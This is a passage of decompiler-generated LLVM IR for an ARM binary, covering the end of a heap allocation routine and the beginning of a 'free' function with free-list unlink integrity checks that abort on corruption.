  %v1_141cc = add i32 %v2_141bc, 12
  %v2_141cc = inttoptr i32 %v1_141cc to i32*
  %v3_141cc = load i32, i32* %v2_141cc, align 4
  store i32 %v3_141cc, i32* %r2.global-to-local, align 4
  br i1 %v9_141c8, label %dec_label_pc_141d4, label %dec_label_pc_14230

dec_label_pc_141d4:                               ; preds = %dec_label_pc_141b8
  %v1_141d4 = add i32 %v3_141cc, 8
  %v2_141d4 = inttoptr i32 %v1_141d4 to i32*
  %v3_141d4 = load i32, i32* %v2_141d4, align 4
  store i32 %v3_141d4, i32* %r3.global-to-local, align 4
  %v9_141d8 = icmp eq i32 %v3_141d4, %v2_141bc
  br i1 %v9_141d8, label %dec_label_pc_141e0, label %dec_label_pc_14230

dec_label_pc_141e0:                               ; preds = %dec_label_pc_141d4
  store i32 %v3_141c0, i32* %v2_141d4, align 4
  %v0_141e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141e4 = load i32, i32* @ip, align 4
  %v2_141e4 = add i32 %v1_141e4, 12
  %v3_141e4 = inttoptr i32 %v2_141e4 to i32*
  store i32 %v0_141e4, i32* %v3_141e4, align 4
  %v0_141e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_141e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_141e8 = add i32 %v1_141e8, %v0_141e8
  store i32 %v2_141e8, i32* %lr.global-to-local, align 4
  %v0_141f0.pre = load i32, i32* @r0, align 4
  %v0_141f4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %dec_label_pc_1419c, %dec_label_pc_141e0
  %v0_14264 = phi i32 [ %v1_141a0, %dec_label_pc_1419c ], [ %v2_141e8, %dec_label_pc_141e0 ]
  %v0_141f4 = phi i32 [ %v3_141b0, %dec_label_pc_1419c ], [ %v0_141f4.pre, %dec_label_pc_141e0 ]
  %v1_14208 = phi i32 [ %v2_141a4, %dec_label_pc_1419c ], [ %v0_141f0.pre, %dec_label_pc_141e0 ]
  %v0_141ec = load i32, i32* @r4, align 4
  %v1_141ec = add i32 %v0_141ec, 44
  %v2_141ec = inttoptr i32 %v1_141ec to i32*
  %v3_141ec = load i32, i32* %v2_141ec, align 4
  store i32 %v3_141ec, i32* %r3.global-to-local, align 4
  %v9_141f0 = icmp eq i32 %v1_14208, %v3_141ec
  %v1_141f4 = and i32 %v0_141f4, -4
  store i32 %v1_141f4, i32* %r5.global-to-local, align 4
  br i1 %v9_141f0, label %dec_label_pc_14264, label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141ec
  %v2_141fc = add i32 %v1_14208, %v1_141f4
  store i32 %v2_141fc, i32* %r3.global-to-local, align 4
  %v1_14200 = add i32 %v2_141fc, 4
  %v2_14200 = inttoptr i32 %v1_14200 to i32*
  %v3_14200 = load i32, i32* %v2_14200, align 4
  store i32 %v3_14200, i32* %r3.global-to-local, align 4
  %v1_14204 = urem i32 %v3_14200, 2
  %v2_14204 = icmp eq i32 %v1_14204, 0
  %v2_14208 = add i32 %v1_14208, 4
  %v3_14208 = inttoptr i32 %v2_14208 to i32*
  store i32 %v1_141f4, i32* %v3_14208, align 4
  br i1 %v2_14204, label %dec_label_pc_14210, label %dec_label_pc_141fc.dec_label_pc_14240_crit_edge

dec_label_pc_141fc.dec_label_pc_14240_crit_edge:  ; preds = %dec_label_pc_141fc
  %v0_14244.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14240

dec_label_pc_14210:                               ; preds = %dec_label_pc_141fc
  %v0_14210 = load i32, i32* @r0, align 4
  %v1_14210 = add i32 %v0_14210, 8
  %v2_14210 = inttoptr i32 %v1_14210 to i32*
  %v3_14210 = load i32, i32* %v2_14210, align 4
  store i32 %v3_14210, i32* @ip, align 4
  %v1_14214 = add i32 %v3_14210, 12
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  %v3_14214 = load i32, i32* %v2_14214, align 4
  store i32 %v3_14214, i32* %r3.global-to-local, align 4
  %v9_14218 = icmp eq i32 %v3_14214, %v0_14210
  %v1_1421c = add i32 %v0_14210, 12
  %v2_1421c = inttoptr i32 %v1_1421c to i32*
  %v3_1421c = load i32, i32* %v2_1421c, align 4
  store i32 %v3_1421c, i32* %r2.global-to-local, align 4
  br i1 %v9_14218, label %dec_label_pc_14224, label %dec_label_pc_14230

dec_label_pc_14224:                               ; preds = %dec_label_pc_14210
  %v1_14224 = add i32 %v3_1421c, 8
  %v2_14224 = inttoptr i32 %v1_14224 to i32*
  %v3_14224 = load i32, i32* %v2_14224, align 4
  store i32 %v3_14224, i32* %r3.global-to-local, align 4
  %v9_14228 = icmp eq i32 %v3_14224, %v0_14210
  br i1 %v9_14228, label %dec_label_pc_14234, label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_14210, %dec_label_pc_141d4, %dec_label_pc_141b8, %dec_label_pc_14224
  %v0_14230 = call i32 @abort()
  store i32 %v0_14230, i32* @r0, align 4
  %v0_14234.pre = load i32, i32* @ip, align 4
  %v1_14234.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14234

dec_label_pc_14234:                               ; preds = %dec_label_pc_14224, %dec_label_pc_14230
  %v1_14234 = phi i32 [ %v3_1421c, %dec_label_pc_14224 ], [ %v1_14234.pre, %dec_label_pc_14230 ]
  %v0_14234 = phi i32 [ %v3_14210, %dec_label_pc_14224 ], [ %v0_14234.pre, %dec_label_pc_14230 ]
  %v2_14234 = add i32 %v1_14234, 8
  %v3_14234 = inttoptr i32 %v2_14234 to i32*
  store i32 %v0_14234, i32* %v3_14234, align 4
  %v0_14238 = load i32, i32* %r2.global-to-local, align 4
  %v1_14238 = load i32, i32* @ip, align 4
  %v2_14238 = add i32 %v1_14238, 12
  %v3_14238 = inttoptr i32 %v2_14238 to i32*
  store i32 %v0_14238, i32* %v3_14238, align 4
  %v0_1423c = load i32, i32* %lr.global-to-local, align 4
  %v1_1423c = load i32, i32* %r5.global-to-local, align 4
  %v2_1423c = add i32 %v1_1423c, %v0_1423c
  store i32 %v2_1423c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14240

dec_label_pc_14240:                               ; preds = %dec_label_pc_141fc.dec_label_pc_14240_crit_edge, %dec_label_pc_14234
  %v0_14244 = phi i32 [ %v0_14244.pre, %dec_label_pc_141fc.dec_label_pc_14240_crit_edge ], [ %v2_1423c, %dec_label_pc_14234 ]
  %v0_14240 = load i32, i32* %r7.global-to-local, align 4
  %v1_14240 = add i32 %v0_14240, 8
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  %v3_14240 = load i32, i32* %v2_14240, align 4
  store i32 %v3_14240, i32* %r2.global-to-local, align 4
  %v1_14244 = or i32 %v0_14244, 1
  store i32 %v1_14244, i32* %r3.global-to-local, align 4
  %v0_14248 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14248, i32* %v2_14240, align 4
  %v0_1424c = load i32, i32* %r1.global-to-local, align 4
  %v1_1424c = load i32, i32* %r2.global-to-local, align 4
  %v2_1424c = add i32 %v1_1424c, 12
  %v3_1424c = inttoptr i32 %v2_1424c to i32*
  store i32 %v0_1424c, i32* %v3_1424c, align 4
  %v0_14250 = load i32, i32* %lr.global-to-local, align 4
  %v1_14250 = load i32, i32* %r1.global-to-local, align 4
  %v3_14250 = add i32 %v1_14250, %v0_14250
  %v4_14250 = inttoptr i32 %v3_14250 to i32*
  store i32 %v0_14250, i32* %v4_14250, align 4
  %v0_14254 = load i32, i32* %r3.global-to-local, align 4
  %v1_14254 = load i32, i32* %r1.global-to-local, align 4
  %v2_14254 = add i32 %v1_14254, 4
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  store i32 %v0_14254, i32* %v3_14254, align 4
  %v0_14258 = load i32, i32* %r2.global-to-local, align 4
  %v1_14258 = load i32, i32* %r1.global-to-local, align 4
  %v2_14258 = add i32 %v1_14258, 8
  %v3_14258 = inttoptr i32 %v2_14258 to i32*
  store i32 %v0_14258, i32* %v3_14258, align 4
  %v0_1425c = load i32, i32* %r7.global-to-local, align 4
  %v1_1425c = load i32, i32* %r1.global-to-local, align 4
  %v2_1425c = add i32 %v1_1425c, 12
  %v3_1425c = inttoptr i32 %v2_1425c to i32*
  store i32 %v0_1425c, i32* %v3_1425c, align 4
  br label %dec_label_pc_14274

dec_label_pc_14264:                               ; preds = %dec_label_pc_141ec
  %v2_14264 = add i32 %v1_141f4, %v0_14264
  %v1_14268 = or i32 %v2_14264, 1
  store i32 %v1_14268, i32* %r3.global-to-local, align 4
  %v1_1426c = load i32, i32* %r1.global-to-local, align 4
  %v2_1426c = add i32 %v1_1426c, 4
  %v3_1426c = inttoptr i32 %v2_1426c to i32*
  store i32 %v1_14268, i32* %v3_1426c, align 4
  %v0_14270 = load i32, i32* %r1.global-to-local, align 4
  %v1_14270 = load i32, i32* @r4, align 4
  %v2_14270 = add i32 %v1_14270, 44
  %v3_14270 = inttoptr i32 %v2_14270 to i32*
  store i32 %v0_14270, i32* %v3_14270, align 4
  br label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %dec_label_pc_14240, %dec_label_pc_14264
  %v0_14274 = load i32, i32* %sl.global-to-local, align 4
  %v2_14274 = icmp eq i32 %v0_14274, 0
  store i32 %v0_14274, i32* %r1.global-to-local, align 4
  br i1 %v2_14274, label %dec_label_pc_14280.loopexit, label %dec_label_pc_1419c

dec_label_pc_14280.loopexit:                      ; preds = %dec_label_pc_14274
  %v0_14280.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14280.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14280.loopexit, %dec_label_pc_1418c
  %v1_14280 = phi i32 [ %v1_14280.pre, %dec_label_pc_14280.loopexit ], [ %v1_1428010, %dec_label_pc_1418c ]
  %v0_14288 = phi i32 [ %v0_14280.pre, %dec_label_pc_14280.loopexit ], [ %v1_14198, %dec_label_pc_1418c ]
  %v9_14280 = icmp eq i32 %v0_14288, %v1_14280
  br i1 %v9_14280, label %dec_label_pc_142f8, label %dec_label_pc_14288

dec_label_pc_14288:                               ; preds = %dec_label_pc_14280
  %v1_14288 = add i32 %v0_14288, 4
  store i32 %v1_14288, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1418c

dec_label_pc_14290.dec_label_pc_14290_crit_edge:  ; preds = %dec_label_pc_14290.preheader, %dec_label_pc_14290.dec_label_pc_14290_crit_edge
  %v0_14290.pre = load i32, i32* @r4, align 4
  %v1_14290.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14290 = mul i32 %v1_14290.pre, 8
  %v5_14290 = add i32 %v4_14290, %v0_14290.pre
  %v1_14294 = add i32 %v1_14290.pre, 1
  store i32 %v1_14294, i32* %r2.global-to-local, align 4
  %v1_14298 = add i32 %v5_14290, 44
  store i32 %v1_14298, i32* %r3.global-to-local, align 4
  %v2_142a0 = add i32 %v5_14290, 52
  %v3_142a0 = inttoptr i32 %v2_142a0 to i32*
  store i32 %v1_14298, i32* %v3_142a0, align 4
  %v0_142a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_142a4 = add i32 %v0_142a4, 12
  %v3_142a4 = inttoptr i32 %v2_142a4 to i32*
  store i32 %v0_142a4, i32* %v3_142a4, align 4
  %v7_142a8 = icmp sgt i32 %v1_14294, 95
  br i1 %v7_142a8, label %dec_label_pc_142ac, label %dec_label_pc_14290.dec_label_pc_14290_crit_edge

dec_label_pc_142ac:                               ; preds = %dec_label_pc_14290.dec_label_pc_14290_crit_edge
  %v0_142ac = load i32, i32* @r4, align 4
  %v1_142ac = inttoptr i32 %v0_142ac to i32*
  %v2_142ac = load i32, i32* %v1_142ac, align 4
  store i32 %v2_142ac, i32* %r2.global-to-local, align 4
  %v1_142b0 = add i32 %v0_142ac, 864
  %v2_142b0 = inttoptr i32 %v1_142b0 to i32*
  %v3_142b0 = load i32, i32* %v2_142b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_142b8 = urem i32 %v2_142ac, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_142c0 = or i32 %v3_142b0, 1
  store i32 %v1_142c0, i32* %r1.global-to-local, align 4
  %v1_142c4 = or i32 %v1_142b8, 72
  store i32 %v1_142c4, i32* %r2.global-to-local, align 4
  %v1_142c8 = add i32 %v0_142ac, 52
  store i32 %v1_142c8, i32* @ip, align 4
  %v2_142cc = add i32 %v0_142ac, 840
  %v3_142cc = inttoptr i32 %v2_142cc to i32*
  store i32 0, i32* %v3_142cc, align 4
  %v0_142d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_142d0 = add i32 %v0_142d0, 65536
  store i32 %v1_142d0, i32* %r3.global-to-local, align 4
  %v0_142d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_142d4 = load i32, i32* @r4, align 4
  %v2_142d4 = add i32 %v1_142d4, 836
  %v3_142d4 = inttoptr i32 %v2_142d4 to i32*
  store i32 %v0_142d4, i32* %v3_142d4, align 4
  %v0_142d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_142d8 = load i32, i32* @r4, align 4
  %v2_142d8 = add i32 %v1_142d8, 844
  %v3_142d8 = inttoptr i32 %v2_142d8 to i32*
  store i32 %v0_142d8, i32* %v3_142d8, align 4
  %v1_142dc = load i32, i32* @r4, align 4
  %v2_142dc = add i32 %v1_142dc, 852
  %v3_142dc = inttoptr i32 %v2_142dc to i32*
  store i32 %v1_142d0, i32* %v3_142dc, align 4
  %v1_142e0 = load i32, i32* @r4, align 4
  %v2_142e0 = add i32 %v1_142e0, 864
  %v3_142e0 = inttoptr i32 %v2_142e0 to i32*
  store i32 %v1_142c0, i32* %v3_142e0, align 4
  %v1_142e4 = load i32, i32* @r4, align 4
  %v2_142e4 = inttoptr i32 %v1_142e4 to i32*
  store i32 %v1_142c4, i32* %v2_142e4, align 4
  %v0_142e8 = load i32, i32* @ip, align 4
  %v1_142e8 = load i32, i32* @r4, align 4
  %v2_142e8 = add i32 %v1_142e8, 44
  %v3_142e8 = inttoptr i32 %v2_142e8 to i32*
  store i32 %v0_142e8, i32* %v3_142e8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_142f0 = call i32 @sysconf(i32 30, i32 %v1_142c0, i32 %v1_142c4, i32 %v1_142d0)
  store i32 %v4_142f0, i32* @r0, align 4
  %v1_142f4 = load i32, i32* @r4, align 4
  %v2_142f4 = add i32 %v1_142f4, 860
  %v3_142f4 = inttoptr i32 %v2_142f4 to i32*
  store i32 %v4_142f0, i32* %v3_142f4, align 4
  br label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %dec_label_pc_14280, %dec_label_pc_142ac
  %v2_142fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_142fc, i32* @r4, align 4
  %v1_14300 = load i32, i32* @r0, align 4
  ret i32 %v1_14300

; uselistorder directives
  uselistorder i32 %v0_142ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_142a4, { 1, 0 }
  uselistorder i32 %v1_14288, { 1, 0 }
  uselistorder i32 %v0_14274, { 0, 2, 1 }
  uselistorder i32 %v0_14250, { 1, 0 }
  uselistorder i32 %v1_141a0, { 1, 0, 2 }
  uselistorder i32 %v0_141b8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14178, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 15, 0, 10, 6, 11, 7, 12, 8, 9, 13, 14, 2, 3, 4, 5 }
  uselistorder i32 95, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder label %dec_label_pc_142f8, { 1, 0 }
  uselistorder label %dec_label_pc_14290.dec_label_pc_14290_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14274, { 1, 0 }
  uselistorder label %dec_label_pc_14240, { 1, 0 }
  uselistorder label %dec_label_pc_14234, { 1, 0 }
  uselistorder label %dec_label_pc_14230, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_141ec, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14304 = load i32, i32* @r4, align 4
  %v6_14304 = load i32, i32* @r5, align 4
  %v9_14304 = load i32, i32* @r6, align 4
  %v12_14304 = load i32, i32* @r7, align 4
  %v18_14304 = load i32, i32* @lr, align 4
  %v0_1430c = load i32, i32* @r0, align 4
  store i32 %v0_1430c, i32* @r6, align 4
  %v2_1430c = icmp eq i32 %v0_1430c, 0
  %v2_14310 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r7, align 4
  br i1 %v2_1430c, label %dec_label_pc_14518, label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14320 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 108) to i32*), align 4
  store i32 %v4_14320, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14320, i32* %r2.global-to-local, align 4
  %v4_1432c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), align 4
  store i32 %v4_1432c, i32* %r1.global-to-local, align 4
  store i32 %v2_14310, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14338 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  store i32 %v4_14338, i32* %ip.global-to-local, align 4
  store i32 82756, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14338)
  %v0_14344 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14344, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1434c = load i32, i32* @r7, align 4
  %v2_1434c = add i32 %v0_1434c, 16
  %v3_1434c = inttoptr i32 %v2_1434c to i32*
  %v4_1434c = load i32, i32* %v3_1434c, align 4
  store i32 %v4_1434c, i32* %ip.global-to-local, align 4
  store i32 82776, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1434c)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1435c = load i32, i32* @r7, align 4
  %v2_1435c = add i32 %v0_1435c, 64
  %v3_1435c = inttoptr i32 %v2_1435c to i32*
  %v4_1435c = load i32, i32* %v3_1435c, align 4
  store i32 %v4_1435c, i32* @lr, align 4
  %v0_14360 = load i32, i32* @r6, align 4
  %v1_14360 = add i32 %v0_14360, -4
  %v2_14360 = inttoptr i32 %v1_14360 to i32*
  %v3_14360 = load i32, i32* %v2_14360, align 4
  store i32 %v3_14360, i32* %r2.global-to-local, align 4
  %v1_14364 = inttoptr i32 %v4_1435c to i32*
  %v2_14364 = load i32, i32* %v1_14364, align 4
  store i32 %v2_14364, i32* %r3.global-to-local, align 4
  %v1_14368 = and i32 %v3_14360, -4
  store i32 %v1_14368, i32* %ip.global-to-local, align 4
  %v1_1436c = add i32 %v0_14360, -8
  store i32 %v1_1436c, i32* @r5, align 4
  store i32 %v1_1436c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_14368, %v2_14364
  br i1 %tmp, label %dec_label_pc_1439c, label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %dec_label_pc_1431c
  %v1_1437c = or i32 %v2_14364, 3
  store i32 %v1_1437c, i32* %r3.global-to-local, align 4
  store i32 %v1_1437c, i32* %v1_14364, align 4
  %v3_14380 = load i32, i32* @lr, align 4
  %v4_14380 = add i32 %v3_14380, -8
  store i32 %v4_14380, i32* %lr.global-to-local, align 4
  %v0_14384 = load i32, i32* %ip.global-to-local, align 4
  %v3_14384 = udiv i32 %v0_14384, 8
  store i32 %v3_14384, i32* %r1.global-to-local, align 4
  %v1_14388 = add i32 %v3_14380, -4
  store i32 %v1_14388, i32* %r2.global-to-local, align 4
  %v4_1438c = mul nuw i32 %v3_14384, 4
  %v5_1438c = add i32 %v4_1438c, %v1_14388
  %v6_1438c = inttoptr i32 %v5_1438c to i32*
  %v7_1438c = load i32, i32* %v6_1438c, align 4
  store i32 %v7_1438c, i32* %r3.global-to-local, align 4
  %v1_14390 = load i32, i32* @r5, align 4
  %v2_14390 = add i32 %v1_14390, 8
  %v3_14390 = inttoptr i32 %v2_14390 to i32*
  store i32 %v7_1438c, i32* %v3_14390, align 4
  %v0_14394 = load i32, i32* @r5, align 4
  %v1_14394 = load i32, i32* %r2.global-to-local, align 4
  %v2_14394 = load i32, i32* %r1.global-to-local, align 4
  %v5_14394 = mul i32 %v2_14394, 4
  %v6_14394 = add i32 %v5_14394, %v1_14394
  %v7_14394 = inttoptr i32 %v6_14394 to i32*
  store i32 %v0_14394, i32* %v7_14394, align 4
  br label %dec_label_pc_14500

dec_label_pc_1439c:                               ; preds = %dec_label_pc_1431c
  %v1_1439c = and i32 %v3_14360, 2
  %v2_1439c = icmp eq i32 %v1_1439c, 0
  br i1 %v2_1439c, label %dec_label_pc_143a4, label %dec_label_pc_144d8

dec_label_pc_143a4:                               ; preds = %dec_label_pc_1439c
  %v1_143a4 = or i32 %v2_14364, 1
  store i32 %v1_143a4, i32* %r3.global-to-local, align 4
  store i32 %v1_143a4, i32* %v1_14364, align 4
  %v0_143ac = load i32, i32* @r6, align 4
  %v1_143ac = add i32 %v0_143ac, -4
  %v2_143ac = inttoptr i32 %v1_143ac to i32*
  %v3_143ac = load i32, i32* %v2_143ac, align 4
  store i32 %v3_143ac, i32* %r3.global-to-local, align 4
  %v0_143b0 = load i32, i32* @r5, align 4
  %v1_143b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_143b0 = add i32 %v1_143b0, %v0_143b0
  store i32 %v2_143b0, i32* %lr.global-to-local, align 4
  %v1_143b4 = urem i32 %v3_143ac, 2
  %v2_143b4 = icmp eq i32 %v1_143b4, 0
  %v1_143b8 = add i32 %v2_143b0, 4
  %v2_143b8 = inttoptr i32 %v1_143b8 to i32*
  %v3_143b8 = load i32, i32* %v2_143b8, align 4
  store i32 %v3_143b8, i32* %r8.global-to-local, align 4
  br i1 %v2_143b4, label %dec_label_pc_143c0, label %dec_label_pc_143f4

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143a4
  %v1_143c0 = add i32 %v0_143ac, -8
  %v2_143c0 = inttoptr i32 %v1_143c0 to i32*
  %v3_143c0 = load i32, i32* %v2_143c0, align 4
  store i32 %v3_143c0, i32* %r1.global-to-local, align 4
  %v2_143c4 = sub i32 %v0_143b0, %v3_143c0
  store i32 %v2_143c4, i32* %r3.global-to-local, align 4
  %v1_143c8 = add i32 %v2_143c4, 8
  %v2_143c8 = inttoptr i32 %v1_143c8 to i32*
  %v3_143c8 = load i32, i32* %v2_143c8, align 4
  store i32 %v3_143c8, i32* %r2.global-to-local, align 4
  %v1_143cc = add i32 %v3_143c8, 12
  %v2_143cc = inttoptr i32 %v1_143cc to i32*
  %v3_143cc = load i32, i32* %v2_143cc, align 4
  store i32 %v3_143cc, i32* %r4.global-to-local, align 4
  %v9_143d0 = icmp eq i32 %v3_143cc, %v2_143c4
  %v1_143d4 = add i32 %v2_143c4, 12
  %v2_143d4 = inttoptr i32 %v1_143d4 to i32*
  %v3_143d4 = load i32, i32* %v2_143d4, align 4
  store i32 %v3_143d4, i32* %r0.global-to-local, align 4
  br i1 %v9_143d0, label %dec_label_pc_143dc, label %dec_label_pc_14440

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143c0
  %v1_143dc = add i32 %v3_143d4, 8
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* %r3.global-to-local, align 4
  %v9_143e0 = icmp eq i32 %v3_143dc, %v2_143c4
  br i1 %v9_143e0, label %dec_label_pc_143e8, label %dec_label_pc_14440

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143dc
  store i32 %v3_143c8, i32* %v2_143dc, align 4
  %v0_143ec = load i32, i32* %r0.global-to-local, align 4
  %v1_143ec = load i32, i32* %r2.global-to-local, align 4
  %v2_143ec = add i32 %v1_143ec, 12
  %v3_143ec = inttoptr i32 %v2_143ec to i32*
  store i32 %v0_143ec, i32* %v3_143ec, align 4
  %v0_143f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_143f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_143f0 = add i32 %v1_143f0, %v0_143f0
  store i32 %v2_143f0, i32* %ip.global-to-local, align 4
  %v0_14400.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14404.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %dec_label_pc_143a4, %dec_label_pc_143e8
  %v0_14480 = phi i32 [ %v1_143b0, %dec_label_pc_143a4 ], [ %v2_143f0, %dec_label_pc_143e8 ]
  %v0_14404 = phi i32 [ %v3_143b8, %dec_label_pc_143a4 ], [ %v0_14404.pre, %dec_label_pc_143e8 ]
  %v1_14418 = phi i32 [ %v2_143b0, %dec_label_pc_143a4 ], [ %v0_14400.pre, %dec_label_pc_143e8 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_143f8 = load i32, i32* @r7, align 4
  %v2_143f8 = add i32 %v0_143f8, 64
  %v3_143f8 = inttoptr i32 %v2_143f8 to i32*
  %v4_143f8 = load i32, i32* %v3_143f8, align 4
  store i32 %v4_143f8, i32* %r2.global-to-local, align 4
  %v1_143fc = add i32 %v4_143f8, 44
  %v2_143fc = inttoptr i32 %v1_143fc to i32*
  %v3_143fc = load i32, i32* %v2_143fc, align 4
  store i32 %v3_143fc, i32* %r3.global-to-local, align 4
  %v9_14400 = icmp eq i32 %v1_14418, %v3_143fc
  %v1_14404 = and i32 %v0_14404, -4
  store i32 %v1_14404, i32* %r0.global-to-local, align 4
  br i1 %v9_14400, label %dec_label_pc_14480, label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %dec_label_pc_143f4
  %v2_1440c = add i32 %v1_14418, %v1_14404
  store i32 %v2_1440c, i32* %r3.global-to-local, align 4
  %v1_14410 = add i32 %v2_1440c, 4
  %v2_14410 = inttoptr i32 %v1_14410 to i32*
  %v3_14410 = load i32, i32* %v2_14410, align 4
  store i32 %v3_14410, i32* %r3.global-to-local, align 4
  %v1_14414 = urem i32 %v3_14410, 2
  %v2_14414 = icmp eq i32 %v1_14414, 0
  %v2_14418 = add i32 %v1_14418, 4
  %v3_14418 = inttoptr i32 %v2_14418 to i32*
  store i32 %v1_14404, i32* %v3_14418, align 4
  br i1 %v2_14414, label %dec_label_pc_14420, label %dec_label_pc_1440c.dec_label_pc_14450_crit_edge

dec_label_pc_1440c.dec_label_pc_14450_crit_edge:  ; preds = %dec_label_pc_1440c
  %v0_14460.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14450

dec_label_pc_14420:                               ; preds = %dec_label_pc_1440c
  %v0_14420 = load i32, i32* %lr.global-to-local, align 4
  %v1_14420 = add i32 %v0_14420, 8
  %v2_14420 = inttoptr i32 %v1_14420 to i32*
  %v3_14420 = load i32, i32* %v2_14420, align 4
  store i32 %v3_14420, i32* %r1.global-to-local, align 4
  %v1_14424 = add i32 %v3_14420, 12
  %v2_14424 = inttoptr i32 %v1_14424 to i32*
  %v3_14424 = load i32, i32* %v2_14424, align 4
  store i32 %v3_14424, i32* %r3.global-to-local, align 4
  %v9_14428 = icmp eq i32 %v3_14424, %v0_14420
  %v1_1442c = add i32 %v0_14420, 12
  %v2_1442c = inttoptr i32 %v1_1442c to i32*
  %v3_1442c = load i32, i32* %v2_1442c, align 4
  store i32 %v3_1442c, i32* %r2.global-to-local, align 4
  br i1 %v9_14428, label %dec_label_pc_14434, label %dec_label_pc_14440

dec_label_pc_14434:                               ; preds = %dec_label_pc_14420
  %v1_14434 = add i32 %v3_1442c, 8
  %v2_14434 = inttoptr i32 %v1_14434 to i32*
  %v3_14434 = load i32, i32* %v2_14434, align 4
  store i32 %v3_14434, i32* %r3.global-to-local, align 4
  %v9_14438 = icmp eq i32 %v3_14434, %v0_14420
  br i1 %v9_14438, label %dec_label_pc_14444, label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %dec_label_pc_14420, %dec_label_pc_143dc, %dec_label_pc_143c0, %dec_label_pc_14434
  %v0_14440 = call i32 @abort()
  store i32 %v0_14440, i32* %r0.global-to-local, align 4
  %v0_14444.pre = load i32, i32* @r1, align 4
  %v1_14444.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14434, %dec_label_pc_14440
  %v1_14444 = phi i32 [ %v3_1442c, %dec_label_pc_14434 ], [ %v1_14444.pre, %dec_label_pc_14440 ]
